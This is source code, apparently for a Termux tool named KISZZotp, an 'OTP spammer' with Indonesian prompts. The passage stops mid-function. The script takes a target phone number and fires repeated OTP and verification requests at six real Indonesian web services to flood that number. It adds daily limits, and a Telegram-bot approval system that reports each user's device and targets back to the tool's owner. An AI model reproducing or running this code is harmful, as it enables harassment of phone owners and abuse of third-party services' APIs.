import axios from 'axios';
import chalk from 'chalk';
import readlineSync from 'readline-sync';
import { execSync } from 'child_process';
import fs from 'fs';
import os from 'os';
import crypto from 'crypto';
import { exec } from 'child_process';

const CONFIG = {
    TELEGRAM_TOKEN: 'GANTI_DENGAN_TOKEN_BOTMU',
    TELEGRAM_CHAT_ID: 'GANTI_DENGAN_CHAT_ID_MU',
    OWNER_NUMBER: '085168142675',
    VERSION: '2.0.0',
    APPROVAL_TIMEOUT: 120,
    POLL_INTERVAL: 1,
    GITHUB_REPO: 'https://github.com/KISZZotp/KISZZotp',
};

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

async function checkUpdate() {
    try {
        console.log(chalk.gray('🔄 Cek update...'));
        const res = await axios.get('https://api.github.com/repos/KISZZotp/KISZZotp/contents/KISZZotp.js', {
            headers: { 'Accept': 'application/vnd.github.v3.raw' }
        });
        const remoteHash = res.data.split('\n')[0];
        const currentHash = fs.readFileSync('KISZZotp.js', 'utf-8').split('\n')[0];
        if (remoteHash !== currentHash) {
            console.log(chalk.yellow('📢 Ada update baru! Mengunduh...'));
            exec('git pull', (err, stdout, stderr) => {
                if (err) {
                    console.log(chalk.red('❌ Gagal update:', stderr));
                } else {
                    console.log(chalk.green('✅ Update berhasil! Restart script...'));
                    process.exit(0);
                }
            });
            return true;
        }
        console.log(chalk.green('✅ Sudah versi terbaru.'));
        return false;
    } catch (e) {
        console.log(chalk.gray('⚠️ Gagal cek update. Lanjut...'));
        return false;
    }
}

function getDailyLimit(termuxId) {
    try {
        if (!fs.existsSync('limits.json')) return { count: 0, date: new Date().toDateString() };
        const data = JSON.parse(fs.readFileSync('limits.json'));
        return data[termuxId] || { count: 0, date: new Date().toDateString() };
    } catch { return { count: 0, date: new Date().toDateString() }; }
}

function incrementDailyLimit(termuxId) {
    try {
        let data = {};
        if (fs.existsSync('limits.json')) {
            data = JSON.parse(fs.readFileSync('limits.json'));
        }
        const today = new Date().toDateString();
        if (!data[termuxId] || data[termuxId].date !== today) {
            data[termuxId] = { count: 1, date: today };
        } else {
            data[termuxId].count += 1;
        }
        fs.writeFileSync('limits.json', JSON.stringify(data, null, 2));
        return data[termuxId].count;
    } catch { return 0; }
}

async function broadcastMessage(message) {
    try {
        const ownerId = CONFIG.TELEGRAM_CHAT_ID;
        await axios.post(`https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: ownerId,
            text: `📢 *BROADCAST*\n${message}`,
            parse_mode: 'Markdown'
        });
        return true;
    } catch { return false; }
}

function getTermuxId() {
    try {
        const uid = execSync('id -u').toString().trim();
        const hostname = os.hostname();
        return `${uid}@${hostname}`;
    } catch { return 'unknown'; }
}

function getDeviceInfo() {
    try {
        const model = execSync('getprop ro.product.model 2>/dev/null || echo "Unknown"').toString().trim();
        const android = execSync('getprop ro.build.version.release 2>/dev/null || echo "Unknown"').toString().trim();
        return `${model} (Android ${android})`;
    } catch { return 'Unknown Device'; }
}

function getCurrentTime() {
    return new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
}

function generateCode() {
    return crypto.randomInt(100000, 999999).toString();
}

async function notifyOwner(message) {
    if (!CONFIG.TELEGRAM_TOKEN || !CONFIG.TELEGRAM_CHAT_ID) return false;
    try {
        await axios.post(`https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: CONFIG.TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        return true;
    } catch { return false; }
}

async function sendTelegramMessage(text, keyboard = null) {
    try {
        const payload = {
            chat_id: CONFIG.TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: 'Markdown',
        };
        if (keyboard) {
            payload.reply_markup = JSON.stringify({ inline_keyboard: keyboard });
        }
        await axios.post(`https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN}/sendMessage`, payload);
        return true;
    } catch { return false; }
}

async function answerCallbackQuery(callbackId, text) {
    try {
        await axios.post(`https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN}/answerCallbackQuery`, {
            callback_query_id: callbackId,
            text: text,
            show_alert: false
        });
    } catch {}
}

async function getTelegramUpdates(offset) {
    try {
        const res = await axios.get(`https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN}/getUpdates`, {
            params: { offset, timeout: 10 }
        });
        return res.data.result || [];
    } catch { return []; }
}

function isApproved(termuxId) {
    try {
        if (!fs.existsSync('approved.json')) return false;
        const data = JSON.parse(fs.readFileSync('approved.json'));
        return data.includes(termuxId);
    } catch { return false; }
}

function isDenied(termuxId) {
    try {
        if (!fs.existsSync('denied.json')) return false;
        const data = JSON.parse(fs.readFileSync('denied.json'));
        return data.includes(termuxId);
    } catch { return false; }
}

function saveApproved(termuxId) {
    try {
        let data = [];
        if (fs.existsSync('approved.json')) {
            data = JSON.parse(fs.readFileSync('approved.json'));
        }
        if (!data.includes(termuxId)) {
            data.push(termuxId);
            fs.writeFileSync('approved.json', JSON.stringify(data, null, 2));
        }
        return true;
    } catch { return false; }
}

function removeApproved(termuxId) {
    try {
        let data = [];
        if (fs.existsSync('approved.json')) {
            data = JSON.parse(fs.readFileSync('approved.json'));
        }
        const newData = data.filter(id => id !== termuxId);
        fs.writeFileSync('approved.json', JSON.stringify(newData, null, 2));
        return true;
    } catch { return false; }
}

function saveDenied(termuxId) {
    try {
        let data = [];
        if (fs.existsSync('denied.json')) {
            data = JSON.parse(fs.readFileSync('denied.json'));
        }
        if (!data.includes(termuxId)) {
            data.push(termuxId);
            fs.writeFileSync('denied.json', JSON.stringify(data, null, 2));
        }
        return true;
    } catch { return false; }
}

function removeDenied(termuxId) {
    try {
        let data = [];
        if (fs.existsSync('denied.json')) {
            data = JSON.parse(fs.readFileSync('denied.json'));
        }
        const newData = data.filter(id => id !== termuxId);
        fs.writeFileSync('denied.json', JSON.stringify(newData, null, 2));
        return true;
    } catch { return false; }
}

function getUserStatus(termuxId) {
    try {
        if (!fs.existsSync('status.json')) return null;
        const data = JSON.parse(fs.readFileSync('status.json'));
        return data[termuxId] || null;
    } catch { return null; }
}

function setUserStatus(termuxId, status) {
    try {
        let data = {};
        if (fs.existsSync('status.json')) {
            data = JSON.parse(fs.readFileSync('status.json'));
        }
        if (status === null || status === undefined || status.trim() === '') {
            delete data[termuxId];
        } else {
            data[termuxId] = status.trim();
        }
        fs.writeFileSync('status.json', JSON.stringify(data, null, 2));
        return true;
    } catch { return false; }
}

function getAllStatus() {
    try {
        if (!fs.existsSync('status.json')) return {};
        return JSON.parse(fs.readFileSync('status.json'));
    } catch { return {}; }
    }
async function requestApproval(userName, termuxId, device) {
    const code = generateCode();
    const keyboard = [
        [
            { text: '✅ Approve', callback_data: `approve_${code}` },
            { text: '❌ Deny', callback_data: `deny_${code}` }
        ]
    ];

    const msg = `🔐 *Request Approval KISZZotp*

👤 Nama: ${userName}
🆔 ID: ${termuxId}
📱 Device: ${device}
🔑 Kode: *${code}*

Tap tombol di bawah:`;

    console.log(chalk.yellow('\n⏳ Mengirim request approval ke owner...'));
    const sent = await sendTelegramMessage(msg, keyboard);
    if (!sent) {
        console.log(chalk.red('❌ Gagal kirim ke Telegram. Cek token & chat ID.'));
        process.exit(1);
    }

    await notifyOwner(`📩 *${userName}* meminta approval.\n🆔 ${termuxId}\n🔑 Kode: ${code}`);

    console.log(chalk.green('✅ Request terkirim! Tunggu owner tap tombol...'));

    let offset = 0;
    try {
        const old = await getTelegramUpdates(offset);
        if (old.length > 0) offset = old[old.length - 1].update_id + 1;
    } catch {}

    const startTime = Date.now();
    while ((Date.now() - startTime) / 1000 < CONFIG.APPROVAL_TIMEOUT) {
        try {
            const updates = await getTelegramUpdates(offset);
            for (const update of updates) {
                offset = update.update_id + 1;

                if (update.callback_query) {
                    const data = update.callback_query.data;
                    const fromId = update.callback_query.from.id;
                    const callbackId = update.callback_query.id;
                    if (fromId == CONFIG.TELEGRAM_CHAT_ID) {
                        if (data === `approve_${code}`) {
                            await answerCallbackQuery(callbackId, '✅ Disetujui!');
                            console.log(chalk.green('\n✅ APPROVED!'));
                            saveApproved(termuxId);
                            await notifyOwner(`✅ *${userName}* (${termuxId}) di-APPROVE.`);
                            return true;
                        } else if (data === `deny_${code}`) {
                            await answerCallbackQuery(callbackId, '❌ Ditolak.');
                            console.log(chalk.red('\n❌ DENIED!'));
                            saveDenied(termuxId);
                            await notifyOwner(`❌ *${userName}* (${termuxId}) di-DENY.`);
                            return false;
                        }
                    } else {
                        await answerCallbackQuery(callbackId, '❌ Anda bukan owner!');
                    }
                }

                if (update.message && update.message.text) {
                    const text = update.message.text;
                    const fromId = update.message.from.id;
                    if (fromId == CONFIG.TELEGRAM_CHAT_ID) {
                        if (text.startsWith('/addpartner')) {
                            const parts = text.split(' ');
                            if (parts.length < 2) {
                                await sendTelegramMessage('❌ Format: /addpartner <termuxId>');
                                continue;
                            }
                            const targetId = parts[1].trim();
                            if (isApproved(targetId)) {
                                await sendTelegramMessage(`✅ ${targetId} sudah ada.`);
                            } else {
                                saveApproved(targetId);
                                await sendTelegramMessage(`✅ ${targetId} ditambahkan.`);
                            }
                        }
                        if (text.startsWith('/removepartner')) {
                            const parts = text.split(' ');
                            if (parts.length < 2) {
                                await sendTelegramMessage('❌ Format: /removepartner <termuxId>');
                                continue;
                            }
                            const targetId = parts[1].trim();
                            if (isApproved(targetId)) {
                                removeApproved(targetId);
                                await sendTelegramMessage(`✅ ${targetId} dihapus.`);
                            } else {
                                await sendTelegramMessage(`❌ ${targetId} tidak ditemukan.`);
                            }
                        }
                        if (text.startsWith('/listpartner')) {
                            try {
                                const data = JSON.parse(fs.readFileSync('approved.json'));
                                if (data.length === 0) {
                                    await sendTelegramMessage('📋 Belum ada partner.');
                                } else {
                                    const list = data.map((id, i) => `${i+1}. ${id}`).join('\n');
                                    await sendTelegramMessage(`📋 *Partner*\n${list}`);
                                }
                            } catch {
                                await sendTelegramMessage('📋 Belum ada partner.');
                            }
                        }
                        if (text.startsWith('/block')) {
                            const parts = text.split(' ');
                            if (parts.length < 2) {
                                await sendTelegramMessage('❌ Format: /block <termuxId>');
                                continue;
                            }
                            const targetId = parts[1].trim();
                            if (isApproved(targetId)) {
                                removeApproved(targetId);
                                saveDenied(targetId);
                                await sendTelegramMessage(`✅ ${targetId} di-BLOCK.`);
                            } else if (isDenied(targetId)) {
                                await sendTelegramMessage(`⚠️ ${targetId} sudah di-block.`);
                            } else {
                                saveDenied(targetId);
                                await sendTelegramMessage(`✅ ${targetId} di-BLOCK.`);
                            }
                        }
                        if (text.startsWith('/unblock')) {
                            const parts = text.split(' ');
                            if (parts.length < 2) {
                                await sendTelegramMessage('❌ Format: /unblock <termuxId>');
                                continue;
                            }
                            const targetId = parts[1].trim();
                            if (isDenied(targetId)) {
                                removeDenied(targetId);
                                await sendTelegramMessage(`✅ ${targetId} di-UNBLOCK.`);
                            } else {
                                await sendTelegramMessage(`❌ ${targetId} tidak di-block.`);
                            }
                        }
                        if (text.startsWith('/listblocked')) {
                            try {
                                const data = JSON.parse(fs.readFileSync('denied.json'));
                                if (data.length === 0) {
                                    await sendTelegramMessage('📋 Belum ada yang di-block.');
                                } else {
                                    const list = data.map((id, i) => `${i+1}. ${id}`).join('\n');
                                    await sendTelegramMessage(`📋 *Diblokir*\n${list}`);
                                }
                            } catch {
                                await sendTelegramMessage('📋 Belum ada yang di-block.');
                            }
                        }
                        if (text.startsWith('/setstatus')) {
                            const parts = text.split(' ');
                            if (parts.length < 3) {
                                await sendTelegramMessage('❌ Format: /setstatus <termuxId> <status>');
                                continue;
                            }
                            const targetId = parts[1].trim();
                            const status = parts.slice(2).join(' ');
                            setUserStatus(targetId, status);
                            await sendTelegramMessage(`✅ Status *${targetId}*: *${status}*`);
                        }
                        if (text.startsWith('/getstatus')) {
                            const parts = text.split(' ');
                            if (parts.length < 2) {
                                await sendTelegramMessage('❌ Format: /getstatus <termuxId>');
                                continue;
                            }
                            const targetId = parts[1].trim();
                            const status = getUserStatus(targetId);
                            if (status) {
                                await sendTelegramMessage(`📌 Status *${targetId}*: *${status}*`);
                            } else {
                                await sendTelegramMessage(`📌 Status *${targetId}*: Gratisan`);
                            }
                        }
                        if (text.startsWith('/liststatus')) {
                            const all = getAllStatus();
                            const keys = Object.keys(all);
                            if (keys.length === 0) {
                                await sendTelegramMessage('📋 Belum ada status custom.');
                            } else {
                                const list = keys.map(id => `- ${id}: ${all[id]}`).join('\n');
                                await sendTelegramMessage(`📋 *Status Custom*\n${list}`);
                            }
                        }
                        if (text.startsWith('/broadcast')) {
                            const msg = text.slice('/broadcast'.length).trim();
                            if (!msg) {
                                await sendTelegramMessage('❌ Format: /broadcast <pesan>');
                                continue;
                            }
                            await broadcastMessage(msg);
                            await sendTelegramMessage(`✅ Broadcast terkirim:\n${msg}`);
                        }
                    }
                }
            }
        } catch {}
        await sleep(CONFIG.POLL_INTERVAL * 1000);
    }

    console.log(chalk.red('\n⏰ Waktu habis!'));
    await notifyOwner(`⏰ *${userName}* (${termuxId}) request timeout.`);
    return false;
}

function getUserName() {
    let name = readlineSync.question(chalk.cyan('Masukkan nama Anda: '));
    if (!name.trim()) name = 'Anonymous';
    return name.trim();
}

function getStatus(userName, termuxId, isOwner) {
    if (isOwner) return chalk.green('★ OWNER');
    const custom = getUserStatus(termuxId);
    if (custom) return chalk.yellow(`▸ ${custom}`);
    return chalk.yellow('▸ Gratisan');
}

function showHeader(user, statusText, termuxId, device) {
    console.clear();
    console.log(chalk.cyan(`
╔═══════════════════════════════════════════════╗
║   ██╗  ██╗██╗███████╗███████╗███████╗       ║
║   ██║ ██╔╝██║╚══███╔╝╚══███╔╝╚══███╔╝       ║
║   █████╔╝ ██║  ███╔╝   ███╔╝   ███╔╝        ║
║   ██╔═██╗ ██║ ███╔╝   ███╔╝   ███╔╝         ║
║   ██║  ██╗██║███████╗███████╗███████╗       ║
║   ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝       ║
║         ${chalk.bold('KISZZotp v' + CONFIG.VERSION)}                     ║
╚═══════════════════════════════════════════════╝
`));
    console.log(chalk.white(`╔═══════════════════════════════════════════════╗`));
    console.log(chalk.white(`║ ${chalk.bold('👤 User')}   : ${chalk.green(user)}`));
    console.log(chalk.white(`║ ${chalk.bold('📊 Status')} : ${statusText}`));
    console.log(chalk.white(`║ ${chalk.bold('🆔 ID')}     : ${chalk.blue(termuxId)}`));
    console.log(chalk.white(`║ ${chalk.bold('📱 Device')} : ${chalk.magenta(device)}`));
    console.log(chalk.white(`║ ${chalk.bold('⏰ Waktu')}  : ${chalk.gray(getCurrentTime())}`));
    console.log(chalk.white(`╚═══════════════════════════════════════════════╝`));
    console.log();
}

function showMenu(isOwner, isPartner) {
    console.log(chalk.yellow(`╔═══════════════════════════════════════════════╗`));
    console.log(chalk.yellow(`║              📋  MENU UTAMA                  ║`));
    console.log(chalk.yellow(`╠═══════════════════════════════════════════════╣`));
    console.log(chalk.yellow(`║ ${chalk.cyan('1.')} 🚀  Halaman Spammer OTP         ║`));
    console.log(chalk.yellow(`║ ${chalk.cyan('2.')} 🐛  Halaman Lapor Bug           ║`));
    console.log(chalk.yellow(`║ ${chalk.cyan('3.')} 🔄  Halaman Cek Update         ║`));
    console.log(chalk.yellow(`║ ${chalk.cyan('4.')} ❌  Keluar                     ║`));
    if (isOwner) {
        console.log(chalk.yellow(`║ ${chalk.cyan('5.')} 👥  Add Partner (Owner Only)    ║`));
    }
    console.log(chalk.yellow(`╚═══════════════════════════════════════════════╝`));
    console.log();
}

async function halamanSpammer(user, termuxId, isOwner, isPartner) {
    console.clear();
    console.log(chalk.cyan(`
╔═══════════════════════════════════════════════╗
║         🚀  HALAMAN SPAMMER OTP              ║
╚═══════════════════════════════════════════════╝
`));

    if (!isOwner && !isPartner) {
        const limitData = getDailyLimit(termuxId);
        const today = new Date().toDateString();
        if (limitData.date === today && limitData.count >= 3) {
            console.log(chalk.red('❌ Limit harian habis! (3× sehari untuk gratisan).'));
            console.log(chalk.gray('💡 Upgrade ke partner untuk unlimited.'));
            readlineSync.question(chalk.gray('\nTekan Enter untuk kembali...'));
            return;
        }
    }

    const targetInput = readlineSync.question(chalk.white('📱 Masukkan nomor target (contoh: 08123456789): '));
    if (!targetInput.trim()) {
        console.log(chalk.red('❌ Nomor tidak boleh kosong!'));
        readlineSync.question(chalk.gray('\nTekan Enter untuk kembali...'));
        return;
    }

    let targets = [];
    if (isPartner || isOwner) {
        targets = targetInput.split(',').map(t => t.trim());
    } else {
        targets = [targetInput.trim()];
    }

    const delay = (isPartner || isOwner) ? 500 : 2000;

    for (const target of targets) {
        let phone = target.replace(/[^0-9]/g, "");
        if (phone.startsWith("0")) phone = "62" + phone.slice(1);
        if (!phone.startsWith("62")) phone = "62" + phone;

        const p08 = "0" + phone.slice(2);
        const p62 = phone;

        console.log(chalk.green(`✅ Target: ${phone}\n`));
        console.log(chalk.gray(`⏳ Mengirim OTP... (delay ${delay/1000}s)\n`));

        await notifyOwner(`🚀 *${user}* (${termuxId}) mulai spam ke \`${phone}\``);

        const otp = [
            { url: "https://internetrakyat.id/api/app/auth/send-otp-register", data: { phone_number: p08 }, headers: { "x-api-key": "REDACTED" } },
            { url: "https://www.alodokter.com/resend-otp", data: { user: { phone: p08, uuid: "f6bd0911---b189-" }, request_via: "whatsapp" } },
            { url: "https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp", data: { accountType: "customers", applicationType: "Pinhome Web", countryCode: "62", medium: "whatsapp", otpType: "register", phoneNumber: p62.replace("62", "") } },
            { url: "https://www.rumah123.com/api/otp/request-otp", data: { ipAddress: "36.67.110.51", phoneNumber: p62, portalId: 1, type: "WHATSAPP", url: "https://www.rumah123.com/user/login" }, headers: { "Base-Url-Core": "https://www.rumah123.com" } },
            { url: "https://beta.api.saturdays.com/api/v1/user/otp/send", data: { number: p62.replace("62", ""), country_code: "+62", type: "" }, headers: { "x-api-key": "REDACTED", "country-code": "ID" } },
            { url: "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata", data: { mobileNumber: p62.replace("62", ""), type: "prospect-create", channel: "whatsapp" } }
        ];

        let success = 0, failed = 0;
        for (let i = 0; i < otp.length; i++) {
            const ep = otp[i];
            try {
                const config = {
                    headers: { "Content-Type": "application/json", "User-Agent": "Mozilla/5.0", ...(ep.headers || {}) },
                    timeout: 10000
                };
                process.stdout.write(`[${i+1}/${otp.length}] 🔄 Mengirim... `);
                if (ep.method === "GET") await axios.get(ep.url, config);
                else await axios.post(ep.url, ep.data, config);
                success++;
                console.log(chalk.green('✅ Berhasil'));
            } catch {
                failed++;
                console.log(chalk.red('❌ Gagal'));
            }
            await sleep(delay);
        }

        const laporan = `📱 Nomor: ${phone}\n📤 Total: ${otp.length}\n✅ Berhasil: ${success}\n❌ Gagal: ${failed}`;
        console.log('\n========== LAPORAN ==========');
        console.log(laporan);
        console.log('===============================\n');

        await notifyOwner(`📊 *Hasil Spam dari ${user}* (${termuxId})\n${laporan}`);
    }

    if (!isOwner && !isPartner) {
        const newCount = incrementDailyLimit(termuxId);
        console.log(chalk.gray(`📊 Sisa limit hari ini: ${3 - newCount} dari 3.`));
    }

    readlineSync.question(chalk.gray('\nTekan Enter untuk kembali ke menu utama...'));
}

function halamanLaporBug(user, termuxId) {
    console.clear();
    console.log(chalk.yellow(`
╔═══════════════════════════════════════════════╗
║         🐛  HALAMAN LAPOR BUG               ║
╚═══════════════════════════════════════════════╝
`));
    console.log(chalk.white(`📱 Nomor Owner: ${CONFIG.OWNER_NUMBER}`));
    console.log(chalk.gray('Kirim pesan ke WhatsApp dengan format:\n- Nama: [Nama Anda]\n- Bug: [Deskripsi bug]\n- Screenshot: [Opsional]\n'));

    const confirm = readlineSync.question(chalk.cyan('Buka WhatsApp sekarang? (y/n): '));
    if (confirm.toLowerCase() === 'y') {
        const url = `https://wa.me/${CONFIG.OWNER_NUMBER}?text=Halo%20KISZZ%2C%20saya%20${encodeURIComponent(user)}%20ingin%20lapor%20bug.%0A%0ADeskripsi%3A%20`;
        execSync(`termux-open-url "${url}"`);
        notifyOwner(`🐛 *${user}* (${termuxId}) membuka lapor bug.`);
    }
    readlineSync.question(chalk.gray('\nTekan Enter untuk kembali ke menu utama...'));
}

async function halamanCekUpdate(user, termuxId) {
    console.clear();
    console.log(chalk.cyan(`
╔═══════════════════════════════════════════════╗
║         🔄  HALAMAN CEK UPDATE              ║
╚═══════════════════════════════════════════════╝
`));
    console.log(chalk.green(`✅ Versi terbaru: ${CONFIG.VERSION}`));
    console.log(chalk.gray('Anda sudah menggunakan versi terbaru.'));
    readlineSync.question(chalk.gray('\nTekan Enter untuk kembali ke menu utama...'));
}

async function halamanAddPartner() {
    console.clear();
    console.log(chalk.green(`
╔═══════════════════════════════════════════════╗
║         👥  ADD PARTNER (OWNER ONLY)         ║
╚═══════════════════════════════════════════════╝
`));

    console.log(chalk.gray('Masukkan Termux ID user yang ingin ditambahkan.'));
    console.log(chalk.gray('Format: contoh -> 10192@localhost\n'));

    const targetId = readlineSync.question(chalk.cyan('📌 Termux ID: '));
    if (!targetId.trim()) {
        console.log(chalk.red('❌ ID tidak boleh kosong!'));
        readlineSync.question(chalk.gray('\nTekan Enter untuk kembali...'));
        return;
    }

    if (isApproved(targetId.trim())) {
        console.log(chalk.yellow(`⚠️ ${targetId} sudah ada di daftar approved.`));
    } else {
        saveApproved(targetId.trim());
        console.log(chalk.green(`✅ ${targetId} berhasil ditambahkan sebagai partner!`));
        await notifyOwner(`👥 *Partner baru*: ${targetId} ditambahkan oleh owner.`);
    
